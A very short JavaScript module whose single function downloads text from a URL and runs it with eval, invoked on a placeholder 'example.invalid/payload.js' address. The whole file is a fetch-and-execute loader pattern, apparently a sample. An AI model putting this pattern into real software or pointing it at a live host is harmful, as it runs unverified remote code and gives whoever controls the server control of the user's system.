import { download } from "./network.js";

export async function launch(url) {
  const payload = await download(url);
  eval(payload);
}

launch("https://example.invalid/payload.js");
